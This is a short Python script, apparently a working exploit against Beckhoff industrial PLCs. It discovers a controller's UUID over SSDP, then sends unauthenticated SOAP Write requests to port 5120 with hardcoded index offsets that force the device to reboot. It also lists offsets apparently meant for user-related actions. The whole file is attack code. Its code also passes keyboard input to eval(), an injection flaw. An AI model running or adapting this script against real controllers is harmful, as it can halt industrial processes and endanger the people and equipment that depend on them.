#! /usr/bin/env python
import sys, http.client, socket, re, base64
from urllib import response

## Defining Functions first:
def rebootMachine(UNS, IP, IO, feedback=True):
        ## This is the SOAP Message:
        SoapMessage = "<?xml version=\"1.0\" encoding=\"utf-8\"?><s:Envelope s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">"
        SoapMessage += "<s:Body><u:Write xmlns:u=\"urn:beckhoff.com:service:cxconfig:1\"><netId></netId><nPort>0</nPort><indexGroup>0</indexGroup>"
        #SoapMessage += "<IndexOffset>-1329528576</IndexOffset>" #This works on CX9020 currently == -982784 - 1267 * 2^20, depends on engineering licenses active or not, they run out after one week
        #SoapMessage += "<IndexOffset>-1330577152</IndexOffset>" #This one used to work, is currently the one for CX2020 == -982784 - 1268 * 2^20, is for INACTIVE licenses
        SoapMessage += "<IndexOffset>-" + IO + "</IndexOffset>"
        SoapMessage += "<pData>AQAAAAAA</pData></u:Write></s:Body></s:Envelope>"
        
        headers = {
        "Host": IP + ":5120",
        "User-Agent": "Tijls Python Script",
        "Content-type": "text/xml; charset=utf-8",
        "Content-length": "%d" % len(SoapMessage),
        "SOAPAction": "urn:beckhoff.com:service:cxconfig:1#Write"
        }
        rebootwebservice = http.client.HTTPConnection(IP, 5120)
        rebootwebservice.request(method="POST", url="/upnpisapi?uuid:" + UNS.decode() + "+urn:beckhoff.com:serviceId:cxconfig",headers=headers)
        rebootwebservice.send(SoapMessage.encode())


###### START PROGRAM #######
if not len(sys.argv) == 2:
        IP = input("Please enter the IPv4 address of the Beckhoff PLC: ")
else:
        IP = sys.argv[1]
        

## Initialize variables
UNS = ''
ActiveRebootIndOff = '1329528576' # Active means active Engineering Licenses (when PLC has been programmed less than a week ago)
InactiveRebootIndOff = '1330577152' # This works for the HMI: 1329528576
HMIRebootIndOff = '1329528576'
ActiveUserIndOff = '1339031296'
InactiveUserIndOff = '1340079872'

print('Finding the unique UNS (UUID) of the target system (' + IP + '), hold on...\n')

DISCOVERY_MSG = ('M-SEARCH * HTTP/1.1\r\n' +
                 'HOST: 239.255.255.250:1900\r\n' +
                 'MAN: "ssdp:discover"\r\n' +
                 'MX: 3\r\n' +
                 'ST: upnp:rootdevice\r\n' +
                 '\r\n')

SOCK = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
SOCK.settimeout(10)
SOCK.sendto(DISCOVERY_MSG.encode(), (IP, 1900))
RESPONSE = SOCK.recv(1000).split(b'\r\n')
print(RESPONSE)

for LINE in RESPONSE:
        if b':uuid' in LINE:
                UNS = LINE[9:45]
                print('Got it: ' + LINE[9:45].decode() + '\n')
SOCK.close()

if not UNS:
        print('\n\nProblem finding UNS, this is full SSDP response: \n')
        for LINE in RESPONSE: print(LINE)
        eval(input('Press Enter to continue...'))
        sys.exit(0)
else:


        if not rebootMachine(UNS, IP, InactiveRebootIndOff):
                rebootMachine(UNS, IP, ActiveRebootIndOff)
                rebootMachine(UNS, IP, HMIRebootIndOff, False)
               
sys.exit(0)


